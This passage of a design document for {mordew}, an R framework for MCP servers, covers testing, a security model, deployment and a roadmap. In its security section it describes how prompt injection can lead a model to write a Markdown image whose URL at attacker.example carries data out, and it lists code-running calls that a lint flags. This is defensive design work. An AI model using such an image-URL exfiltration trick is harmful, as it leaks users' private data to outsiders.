MCP Inspector, the reference client of the MCP project, run with `npx`
in its CLI mode, pinned to the version checked. The server and
`{mordew}`'s client share one reading of the protocol, so a mistake in it
would pass unnoticed between them: a client written by others catches it.
Both clients give the same result shape, so a test can compare them:

```r
test_that("summarise_runs answers the same through the MCP Inspector", {
  skip_on_cran()
  args <- list(
    year = 2025
  )
  expect_identical(
    call_tool(
      "summarise_runs",
      args,
      client = "inspector"
    ),
    call_tool(
      "summarise_runs",
      args
    )
  )
})
```

**Level 3, behaviour**, uses evals: each case is a user prompt with the
tool calls to accept, scored over several runs. Evals need the `claude` CLI
logged in or an API key, cost one request per run and are not
deterministic, so they live in `dev/`, out of `R CMD check`, and run in a
separate CI job started by hand, before releases and whenever a tool
description, the system prompt or the model changes.

```r
# dev/evals.R, written by use_evals()
cases <- list(
  mordew::eval_case(
    "Show me my long runs in 2024.",
    mordew::tool_call(
      "get_runs",
      year = 2024,
      type = "long"
    )
  ),
  mordew::eval_case(
    "What will the weather be in Brussels tomorrow?"
  )
)

results <- mordew::run_evals(
  cases,
  runs = 5
)
mordew::assert_pass_rate(
  results
)
```

`run_evals()` asks each question through a Claude Code session restricted
to the package's server, in its development version, and checks every call
the model makes: each argument on its own terms (`partial()` accepts part
of a name), any of the answers of the case, all the calls of an answer, and
no call for a case without an answer. It flags a run that takes more calls
than the longest answer. `assert_pass_rate()` stops when a case passes in
less than 80% of its runs: a rate per case, so that a case that always
fails cannot hide among the others. When `ANTHROPIC_API_KEY` is set, as
in the CI workflow, the session runs with `--bare`, which leaves out the
developer's `CLAUDE.md`, memory, hooks and plugins: that run is the
reference. Without it, `--bare` would ignore a subscription login, so a
local run on a subscription still reads that configuration. The `claude`
CLI inherits R's environment: a key in `.Renviron` makes local runs use
it, billed per token, even when the shell has none.

**Security tests** feed hostile arguments to each tool. Wrong types and
values outside the schema never reach it: validation rejects them first,
for every tool. What the schema accepts does reach it, so
`expect_hostile_safe()`, which `add_tool()` writes in the tests of each
tool, starts from valid arguments and replaces one at a time by each
extreme value its schema accepts: an empty or a 100,000-character string,
the bounds of a number, or the largest numbers when it has none. Every
call must get an answer, success or `isError`: a server that stops or
hangs fails the test. A success can still leak data, which no generic
test can judge: paths outside the allowed scope are kept out by a
`pattern` on the argument and by OS-level isolation in production.
`check_tools()`, which the package template runs in a test, reads the
code of every function of the package and flags the calls through which
an argument could become code (`eval()`, `parse()`, `source()`,
`system()` and similar). It only sees direct calls to these functions in
the body of a function: a function passed as a value
(`lapply(x, eval)`), a call by name (`do.call("system", ...)`), a call in
a default argument, or another way to run code (`pipe()`,
`glue::glue()`, `rlang::eval_tidy()`, `processx::run()`) goes unnoticed,
so a clean result is not a proof.

The helpers: `call_tool()`, `expect_tool_error()`,
`expect_tool_schema()`, `use_evals()`, `eval_case()`, `tool_call()`,
`partial()`, `run_evals()`, `assert_pass_rate()`, `check_tools()`,
`expect_hostile_safe()`.

---

## Security model

### Principles

1. **The tool list is the security boundary, not R.** The model can only
   call what the server exposes, but anything a tool can do, the model
   can trigger.
2. **Arguments are untrusted input.** The model generates them, and the
   content it reads (data, documents, web pages) can steer it through
   prompt injection.
3. **Everything a tool returns leaves your infrastructure.** The model
   provider reads every result, unless the model is self-hosted.
4. **Instructions are not enforcement.** Telling a client "only use this
   MCP server" is a preference the model usually follows, not a guarantee.
   Only the tools actually available to it are enforced. In a default
   Claude Desktop or Claude Code setup, a `{mordew}` server sits next to
   other connectors and built-in tools that we do not control. Only two
   setups control the full tool list: a client we build ourselves (see
   [Clients we build ourselves](#clients-we-build-ourselves)), and a
   [Claude Code session restricted to the
   server](#a-claude-code-session-restricted-to-the-server).

[Posit warns](https://tidyverse.org/blog/2025/07/mcptools-0-1-0/) that
mixing MCP servers can create the "lethal trifecta": access to private
data, exposure to untrusted content, and a way to send data out. A
`{mordew}` server holds the first one by design, so the other two must be
kept away.

### Controls

| Risk                                  | Control                                                                                                                                                                                                                                      |
| ------------------------------------- | -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Arbitrary code execution              | No free-form "run R code" tool. `check_tools()` statically flags `eval(parse())`, `system()`, `source()` and similar direct calls in tool code: a lint, not a proof.                                                                         |
| Malformed or hostile arguments        | Validation generated from the schema, before the function runs.                                                                                                                                                                              |
| R can still reach the system          | OS-level isolation in production: non-root container, read-only file system, restricted network egress. On Linux, per-call sandboxing with `unix::eval_safe()` or [RAppArmor](https://cran.r-project.org/web/packages/RAppArmor/index.html). |
| Runaway calls                         | Over HTTP, a timeout per call (60 seconds by default) and a bounded queue. |
| Data leakage to the model provider    | Aggregated outputs by default, `@mcpLimit rows`, and, on the client side, the option of a self-hosted model. Known limit: `@mcpLimit rows` caps one call, not a conversation: a model can split its request to get around it. |
| Unauthorised access to an HTTP server | A shared bearer token, or a proxy that authenticates in front, with a warning when the server is open beyond the machine; for OAuth 2.1 as in the MCP authorization specification, a gateway in front of the server. |
| Secrets exposed to the model          | Secrets come from environment variables or config, never from tool arguments or results.                                                                                                                                                     |

### Clients we build ourselves

A chat is outside `{mordew}`'s scope, but whoever builds one on top of a
`{mordew}` server needs to know why it differs from third-party clients, and
where it can still leak.

In Claude Code or Codex, we configure someone else's product, which ships
its own tools and reads other configuration sources: we can only remove
what its vendor lets us remove. In a chat we build, **we are the
client**. Our code (for example ellmer) calls the model API and sets the
tool list sent with every request:

- A model called through an API has no tools by default: no shell, no
  files. It can only request the tools declared in the request, here the
  `{mordew}` registry.
- Tools run in the client's code. A tool the model invents has no
  function behind it.
- Tools hosted by the model provider (web search, code execution) are
  only enabled if the request asks for them.
- Users cannot add connectors or MCP servers, and the system prompt is
  ours.

Three risks remain:

1. Tool results still go to the model provider.
2. Prompt injection through the data can still make the model misuse our
   own tools, hence argument validation and limits on the server side.
3. **The chat UI itself can leak data.** If it renders Markdown images, an
   injected instruction can make the model write an image whose URL
   carries data (`![](https://attacker.example/?d=...)`), and the browser
   sends it when loading the image. Such a chat must not load remote
   images or other remote resources from model output: render
   images as plain links or drop them, and set a Content Security Policy
   that only allows the app's own origin.

---

## Deployment

| Target                | Transport | How                                                                                                |
| --------------------- | --------- | -------------------------------------------------------------------------------------------------- |
| Local, desktop client | stdio     | `Rscript --no-init-file -e "pkg::run_mcp_server()"`, snippet from `mcp_client_config()`            |
| Docker                | HTTP      | `add_dockerfile()`, built on [dockerfiler](https://github.com/ThinkR-open/dockerfiler) as in golem |
| Posit Connect         | HTTP      | `add_connect()` writes `_server.yml` with `engine: mordew`; `rsconnect::deployAPI(".", contentCategory = "mcp")` |

### Posit Connect

Connect serves `{mordew}` packages through plumber2's `_server.yml`
standard, as it serves mcptools: the file's first line names the engine
package, and Connect calls that package's `launch_server(settings, host,
port)`, which serves until the process stops. `add_connect()` writes
`_server.yml` with `engine: mordew` at the package root and keeps it out
of the build; `mordew:::launch_server()` installs the deployed package
into a temporary library, then serves it over HTTP on the host and port
Connect gives, with its worker pool:

```r
mordew::add_connect()
rsconnect::deployAPI(
  ".",
  contentCategory = "mcp"
)
```

```bash
claude mcp add --transport http runlog https://connect.example.com/content/<guid>/mcp \
  --header "Authorization: Key <Connect API key>"
```

Connect authenticates the clients itself, with its API keys, and strips
the `Authorization` header before the request reaches the server: the
server runs without a token there. Checked on Connect 2026.06.1 with a
`{mordew}` package: `initialize`, `tools/list` and `tools/call` over
`/mcp`. rsconnect 1.6.0 creates the content, then fails to upload the
bundle with a 404; 1.12.0 deploys it. Until `{mordew}` is on CRAN,
Connect installs it from GitHub, which takes the
`Remotes: ThinkR-open/mordew` that `create_mordew()` writes in the
package's `DESCRIPTION`, and
`{mordew}` installed from GitHub (`pak::pak("ThinkR-open/mordew")`)
where you deploy: rsconnect records each dependency as it is installed
there.

### When a single process is enough

- **stdio**: never needs scaling. Each client spawns its own R process.
- **HTTP for one user, or with fast tools and little traffic**: one
  process is enough, as long as calls stay well under the timeouts.

Everything else, meaning several users at the same time or tools that
take seconds, needs asynchronous execution.

### Scaling an HTTP deployment

Because a process that runs tools itself runs one call at a time, there
are two ways to serve concurrent calls.

**A. Replicas behind a load balancer.** N identical R processes or
containers, behind nginx, Traefik or a Kubernetes Service. It works as
long as the HTTP transport stays stateless. The cost is memory: each
replica loads its own copy of the data.

```mermaid
flowchart LR
  C["MCP clients"] --> LB["Load balancer<br/>TLS, auth, least connections"]
  LB --> R1["R process 1<br/>run_mcp_server()"]
  LB --> R2["R process 2<br/>run_mcp_server()"]
  LB --> R3["R process N<br/>run_mcp_server()"]
```

**B. One asynchronous front, a pool of workers.** A single HTTP process
whose handler returns a promise instead of blocking, while tools run in a
pool of mirai daemons. The front keeps accepting requests while tools
compute; data can be loaded once per worker; there is a single container
to deploy.

```mermaid
flowchart LR
  C["MCP clients"] --> P["Reverse proxy<br/>TLS, auth"]
  P --> F["Async HTTP front<br/>httpuv handler returns a promise"]
  F --> W1["mirai worker 1"]
  F --> W2["mirai worker 2"]
  F --> W3["mirai worker N"]
```

**A + B.** Several replicas, each with its own worker pool, for large
deployments.

`run_mcp_server(transport = "http")` implements B with httpuv and
mirai. The front answers `initialize`, `ping` and `tools/list` itself,
so that they
never wait behind a tool, and hands each `tools/call` to a worker,
answering with a promise. The workers load the package before the server
serves. At most one call runs per worker; the others wait in a bounded
queue held by the front, which hands a call to mirai only when a worker
is free, so that mirai's timeout counts the run time and not the wait. A
call that finds the queue full gets a "busy, retry later" error at once;
a call that times out, or whose worker stops, gets an `isError` result.

A worker that stops, killed or crashed during a call, is replaced at
once: the replacement takes the front's library paths through `R_LIBS`
and loads the package on its first call.

Not handled yet: a worker that ignores the interrupt at its timeout
(compiled code), cancellation, progress, sessions and SSE streams, and
per-tool limits.

### Load balancer checklist

- **Algorithm**: least connections rather than round-robin, because call
  durations vary widely and each process (or worker) runs one call at a
  time.
- **Health check**: on `GET /health`, which `{mordew}`'s front answers.
- **Timeouts**: align the proxy timeouts with the longest tool. nginx's
  `proxy_read_timeout` defaults to 60 seconds; a longer tool ends in a 504.
- **Origin**: the proxy must forward the original `Origin` header, so
  that the server can check it.
- **Authentication and TLS**: at the proxy (OAuth or OIDC).
- **No sticky sessions**, as long as tools keep no state in memory.

### Containers

`add_dockerfile()` builds on
[dockerfiler](https://github.com/ThinkR-open/dockerfiler)'s
`dock_from_desc()`, the same way golem does: it installs the package's
dependencies, then the package, and adds what a server needs:

- a non-root user, `mordew`
- the port, 8080 by default
- a health check that reads `GET /health` with base R, so the image needs
  no curl
- a start on `0.0.0.0` through `mordew::run_mcp_server()`, whatever the
  package's own `run_mcp_server()` takes, with the token of
  `MORDEW_TOKEN`; without one,
  for instance behind a proxy that authenticates, it warns at start-up

What it adds for `runlog`, after the lines from dockerfiler:

```dockerfile
RUN useradd --create-home mordew
USER mordew
EXPOSE 8080
HEALTHCHECK CMD Rscript -e 'readLines("http://127.0.0.1:8080/health", warn = FALSE)'
CMD ["Rscript", "-e", "mordew::run_mcp_server('runlog', transport = 'http', host = '0.0.0.0', port = 8080)"]
```

```bash
docker build -t runlog .
docker run -e MORDEW_TOKEN=... -p 8080:8080 runlog
```

Three things to know:

- **System requirements.** dockerfiler computes them with pak, which
  does not find `{mordew}` while it is not on CRAN, with or without
  `Remotes: ThinkR-open/mordew`: `add_dockerfile()` stops with "Can't
  find package called mordew".
  `add_dockerfile(sysreqs = FALSE, extra_sysreqs = "zlib1g-dev")` skips
  that computation and gives httpuv what it needs to compile.
- **A failed install fails the build** with dockerfiler 1.0.0, which runs
  every install with `options(warn = 2)`. With 0.2.5, it is only a
  warning, and the image lacks the package.
- **The package's `Suggests` are installed too**, though a server does not
  need them. `pkgload` pulls `fs`, which needs libuv: without the computed
  system requirements, `fs` fails to install, which stops the build with
  dockerfiler 1.0.0 (seen on arm64), and leaves the image without `fs`,
  `pkgload` and `testthat` with 0.2.5.

### Container checklist

- **Bind to `0.0.0.0`.** A server listening on `127.0.0.1` is
  unreachable from outside the container.
- **Non-root user**, read-only root file system, only temporary
  directories writable.
- **Health check** on a dedicated endpoint (see the load balancer
  checklist).
- **Secrets and model API keys** come from environment variables or a
  secret store, never baked into the image.
- **Configuration** through environment variables: `MORDEW_TOKEN`.
- **stdout is reserved for the protocol in stdio mode.** The server
  diverts what a tool prints to stderr, but anything written to stdout
  before it starts (a `.Rprofile`, a noisy `.onLoad()`) corrupts the
  JSON-RPC stream; logs go to stderr or to a file.
- **Pinned versions**: R version, `renv.lock`, base image digest.
- **Resource limits** (CPU, memory) per container, sized to the worker
  pool.
- **Restricted network egress**, as described in the security model.

---

## Relationship with golem

- Same philosophy: a package, `dev/` scripts, conventions over configuration.
- Same tooling where possible: dockerfiler.

---

## Roadmap and task list

Phases 0 to 3, the proof of concept, are built: tools over stdio and
HTTP, the testing toolkit, and deployment to Docker and Posit Connect.
What is left to publish it comes first; what follows is a direction,
not a commitment. The aim is to make `{mordew}` an MCP SDK as well as a
framework.

### Publish the proof of concept

Checks rather than code: each needs the repository public or a real
instance.

- [ ] Open the repository
- [ ] Deploy `runlog` on a real Posit Connect, and connect a client to it
- [ ] Turn on the `R-CMD-check` and `format-check` workflows
- [ ] Run the evals workflow on a real CI job: the `claude` CLI on the runner, and a missing `ANTHROPIC_API_KEY` secret, are untested
- [ ] Build a Docker image with `Remotes: ThinkR-open/mordew`, its system requirements computed by pak

### Before each release

- [ ] Re-check the client restriction options: they change quickly. Manual for now (Claude Code flags checked with 2.1.331 on 2026-11-24); automating it is in the list below

### Later, beyond the proof of concept

The production features below wait until the proof of concept has been
tried by others.

- [ ] `inst/mordew/config.yml` in the package template: transport, port, workers, limits, audit log
- [ ] Worker pool configuration: size, memory, data loaded at start-up
- [ ] A timeout per tool (`@mcpLimit seconds`), stopping a worker that ignores the interrupt at its timeout (compiled code), and resource limits
- [ ] Rows per session on top of rows per call: `@mcpLimit rows` caps one call, and a model can split its request to get around it
- [ ] `mordew::report_progress()` and cancellation that stops and recycles the worker
- [ ] Tasks extension: `@mcpTask`, `tasks/get`, `tasks/update`, shared task store, handle checks, time-to-live, and `expect_task()`
- [ ] `@mcpConfirm` and `@mcpElicit`, resolved before the tool runs; `mordew::elicit()` under Multi Round-Trip Requests for dynamic cases; `simulate_elicitation()` to test them
- [ ] Deployment guide for replicas behind a load balancer (architecture A), with nginx and Kubernetes examples
- [ ] Load tests: concurrent users, slow tools, timeouts, queue saturation
- [ ] Check that tools keep no in-memory state (a contract test)
- [ ] Generated `docker-compose.yml`: MCP server and reverse proxy
- [ ] Audit log, with queue time and run time
- [ ] Session-scoped object store, if the prototype shows it is needed
- [ ] OpenTelemetry tracing
- [ ] Kubernetes manifests example
- [ ] Redaction hook and output policies
- [ ] Automate the restriction check: a separate CI job starts the session that `mcp_client_config("claude_code")` writes and checks that the model only gets the server's tools. It needs the `claude` CLI and an API key in the repository secrets, and costs a request per run. To verify first: that the session's `stream-json` init message lists its tools
- [ ] Launch the session of `run_dev(client = "claude")` when the R console is itself a terminal, as in VS Code with vscode-R. To test first: `system("claude")` from the console, and `isatty(stdin())` to tell it from Positron, whose console is not a terminal
- [ ] Extreme values for arrays and objects in `expect_hostile_safe()`
- [ ] A way to allow a reviewed call in `check_tools()`, such as `system2()` with fixed arguments, once a real tool needs one

### Phase 4: specification coverage, conformance and SDK

- [ ] `add_resource()` and `add_prompt()`: resource and prompt files, prompt template in `inst/mordew/prompts/`, test files
- [ ] Handlers for `resources/list`, `resources/read`, `resources/templates/list`, `prompts/list` and `prompts/get`
- [ ] `read_resource()`, `expect_resource()`, `get_prompt()`, `expect_prompt()`
- [ ] 2026-07-28 core: `server/discover`, `resultType`, `serverInfo` in `_meta`, deterministic tool order, per-request log levels
- [ ] Cacheable results: `ttlMs` and `cacheScope` on lists and resource reads
- [ ] `Mcp-Method` and `Mcp-Name` headers, with `HeaderMismatchError`
- [ ] `x-mcp-header` on tool parameters: mirrors a parameter into an HTTP header
- [ ] Tool icons (`icons`)
- [ ] Serve 2025-11-25 and 2026-07-28 clients side by side
- [ ] Structured output: `@mcpOutput`, `structuredContent` validated against the schema, and `expect_structured_output()`
- [ ] Completion: automatic for enums, `@mcpComplete` for dynamic values
- [ ] OpenTelemetry trace context propagation from `_meta`
- [ ] Conformance test suite for both revisions, with `expect_conformance()`
- [ ] Export a public SDK API, kept stable from then on: a server built from a registry rather than a package, over stdio and HTTP (the HTTP workers read the registry from the package today)
- [ ] Declare tools in code as well as with roxygen
- [ ] Export the stdio client

### Phase 5: extensions

- [ ] MCP Apps: `@mcpApp`, htmlwidgets rendered inline, self-contained HTML
- [ ] Skills over MCP: skills shipped in `inst/mordew/skills/`
- [ ] Change notifications through `subscriptions/listen`, if dynamic registries or updated resources need them

### Phase 6: documentation and launch

- [ ] Vignettes: getting started, writing tool descriptions, testing, security, deployment
- [ ] Publish the pkgdown site
- [ ] `runlog`, a demo package built with `{mordew}` on a fake running log (distance, elevation gain, pace, surface), in its own repository
- [ ] Hex sticker
- [ ] Blog post and conference talk
- [ ] A stable release on CRAN
- [ ] Ask the MCP SDK Working Group to list `{mordew}` as an official SDK

---

## Design decisions

- **The registry is generated, not introspected at runtime.** An
  installed package keeps no roxygen comments (R drops them at install
  time), so there is nothing to introspect at runtime; and a committed
  registry makes the security boundary — the tool list — reviewable in
  every diff.
- **Types are explicit tags whose content is an R expression** (see
  [Writing a tool](#writing-a-tool)).
- **`{mordew}` ships no chat.** A chat is a separate product and talks
  to a `{mordew}` server through MCP, like any client.
- **`{mordew}` ships its own protocol layer**, server and stdio client
  (see [Why not build on mcptools](#why-not-build-on-mcptools)).
- **One package.** Runtime `Imports` stay minimal — what
  `run_mcp_server()` executes: jsonlite for the protocol, httpuv, mirai
  and promises for HTTP. The development and testing tooling (testthat,
  pkgload, processx, dockerfiler…) lives in `Suggests`, installed on a
  development machine with `mordew::install_dev_deps()`, the golem
  pattern.
- **Default architecture for HTTP: the worker pool (B).**
  `run_mcp_server(transport = "http")` runs one, and replicas of it
  behind a load balancer (A + B) stay possible.
- **A generated package depends on `{mordew}` at runtime**, as golem
  apps depend on golem. The deciding argument is security: validation,
  limits and serialisation are load-bearing, and a fix to them must
  reach every deployed server through an update of `{mordew}`, never
  through regenerating and re-releasing each package. The generated
  registry stays declarative data; everything that executes is
  imported. The costs are accepted: `{mordew}` must be on CRAN before
  any package built with it is, and every user installs `{mordew}`'s
  dependencies. Until then, a package installs it from GitHub with the
  `Remotes: ThinkR-open/mordew` that `create_mordew()` writes.

  A `{mordew}` package should pass `R CMD check --as-cran`: evals and
  `dev/` in `.Rbuildignore`, round-trip tests through a subprocess
  skipped on CRAN, examples that never start a blocking server, small
  example data.

- **`{mordew}` speaks MCP 2025-11-25.** It is what clients send today:
  Claude Code 2.1.251 and 2.1.330 both open with `initialize` and
  `protocolVersion: 2025-11-25` (checked on 2026-11-22). 2026-07-28
  support is on the roadmap, served side by side.

---

## Risks

| Risk                               | Why it is serious                                                                                                                                                             | Mitigation                                                                                                                                                                                     |
| ---------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| Overlap with Posit's tooling       | Posit maintains the whole stack (ellmer, mcptools, shinychat, Connect), and FastMCP 1.0 was absorbed into the official Python SDK.                                            | Focus on what mcptools does not cover (project structure, testing, production outside Connect).                                                                                                |
| The MCP specification changes fast | [Posit describes MCP](https://tidyverse.org/blog/2025/07/mcptools-0-1-0/) as a recent and rapidly evolving framework, and following it is `{mordew}`'s own work, since it ships its own protocol layer. | Keep the protocol layer thin, and test it through a client written by others, the MCP Inspector. |
| Maintenance cost                   | Open source means issues, support and upgrades.                                                                                                                               | Keep the scope small and the protocol layer thin, welcome contributors early.                                                                                                                  |
| Unclear adoption                   | Real use cases still have to be collected.                                                                                                                                    | Build the prototype on real use cases before the first release.                                                                                                                                |
| Flaky, costly evals                | Models are not deterministic, and every eval run costs tokens.                                                                                                                | Thresholds, several runs per case, a separate CI job.                                                                                                                                          |
| A blocking server in production    | A process that runs tools itself runs one call at a time; one slow call blocks every user.                                                                                    | Asynchronous execution over HTTP: a mirai worker pool (B), with a timeout per call and a bounded queue; replicas behind a load balancer (A) on top.                                            |

---

## About the name

`{mordew}` is the city in Alex Pheby's novel of the same name, where God is
dead and his corpse lies in the catacombs beneath the streets, while the
Living Mud spawns half-formed, short-lived creatures. A golem is clay
brought to life by words; `{mordew}` is mud that spawns life. In French, the
name sounds like _mordieu_, an old oath meaning "by God's death".

---

## References

- [mcptools](https://posit-dev.github.io/mcptools/) and [`mcp_server()` reference](https://posit-dev.github.io/mcptools/reference/server.html)
- [R and the Model Context Protocol](https://tidyverse.org/blog/2025/07/mcptools-0-1-0/), tidyverse blog
- [mcpr (devOpifex)](https://github.com/devOpifex/mcpr)
- [mcpr (chi2labs)](https://chi2labs.github.io/mcpr/index.html)
- [plumber2mcp](https://github.com/armish/plumber2mcp)
- [mcplite](https://CRAN.R-project.org/package=mcplite)
- [shinychat: tool calling UI](https://opensource.posit.co/blog/2025-11-20_shinychat-tool-ui/)
- [FastMCP documentation](https://gofastmcp.com/docs) and [README](https://github.com/PrefectHQ/fastmcp)
- [RAppArmor](https://cran.r-project.org/web/packages/RAppArmor/index.html)
- [Model Context Protocol](https://modelcontextprotocol.io/)
- [Specification, 2026-07-28](https://modelcontextprotocol.io/specification/2026-07-28) and [its changelog](https://modelcontextprotocol.io/specification/2026-07-28/changelog)
- [Announcement of the 2026-07-28 specification](https://blog.modelcontextprotocol.io/posts/2026-07-28/)
